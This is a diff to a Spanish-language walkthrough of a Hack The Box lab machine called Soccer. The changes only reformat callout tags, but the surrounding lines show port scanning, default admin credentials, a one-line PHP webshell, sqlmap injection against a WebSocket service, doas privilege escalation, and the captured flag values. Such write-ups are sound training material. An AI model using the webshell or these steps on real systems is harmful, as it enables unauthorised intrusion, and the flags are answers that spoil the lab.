@@ -41,7 +41,7 @@ Escaneo todos los puertos con [[nmap]] para encontrar servicios abiertos.
 nmap -sS --min-rate 5000 -n -Pn -p- --open 10.10.11.194 -oG allPorts
 ```
 
-> [!NOTE] Puertos Abiertos
+> [!note] Puertos Abiertos
 > - **22/tcp:** ssh
 > - **80/tcp:** http
 > - **9091/tcp:** xmltec-xmlmail (probablemente WebSockets)
@@ -62,7 +62,7 @@ PORT     STATE SERVICE         VERSION
 ### Enumeración Web (Puerto 80)
 
 El puerto 80 redirige a `soccer.htb`. Añado esta entrada al `/etc/hosts`.
-> [!TIP] /etc/hosts
+> [!tip] /etc/hosts
 > ```
 > 10.10.11.194 soccer.htb
 > ```
@@ -88,7 +88,7 @@ Buscando en Google, encuentro las credenciales por defecto para Tiny File Manage
 > - **password:** `admin@123`
 
 Una vez dentro, veo que puedo subir archivos. Como la web usa PHP, subiré una webshell simple al directorio `/tiny/uploads/`.
-> [!NOTE] Webshell PHP
+> [!note] Webshell PHP
 > ```php
 > `<?php
 >   system($_REQUEST['cmd']);
@@ -127,7 +127,7 @@ cat /etc/nginx/sites-available/soc-player.htb
 
 Añado el nuevo subdominio a nuestro `/etc/hosts`.
 
-> [!TIP] /etc/hosts (Actualizado)
+> [!tip] /etc/hosts (Actualizado)
 > ```
 > 10.10.11.194 soccer.htb soc-player.soccer.htb
 > ```
@@ -178,7 +178,7 @@ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"1"}' -D soccer_db -T 
 
 Me conecto por SSH con las credenciales de `player` y obtengo la flag de usuario.
 
-> [!FLAG] user.txt
+> [!flag] user.txt
 > `b4e17edd06d473a7463d00886dafdcc7`
 
 
@@ -193,12 +193,12 @@ Busco binarios con permisos SUID.
 find / -perm -4000 2>/dev/null
 ```
 
-> [!NOTE] Binario SUID Interesante
+> [!note] Binario SUID Interesante
 > `/usr/local/bin/doas`
 
 [[doas]] es una alternativa a `sudo`. Reviso su configuración, que a menudo se encuentra con herramientas como `LinPEAS`.
 
-> [!INFO] Configuración de doas
+> [!info] Configuración de doas
 > El archivo `/usr/local/etc/doas.conf` revela la siguiente regla:
 > `permit nopass player as root cmd /usr/bin/dstat`
 
@@ -239,15 +239,15 @@ whoami
 ```
 
 Obtengo la flag de root.
-> [!FLAG] root.txt
+> [!flag] root.txt
 > `bd1e67df6f523a3f05974c75caf3abb3`
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > b4e17edd06d473a7463d00886dafdcc7
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > bd1e67df6f523a3f05974c75caf3abb3
-^bandera
+^bandera-root
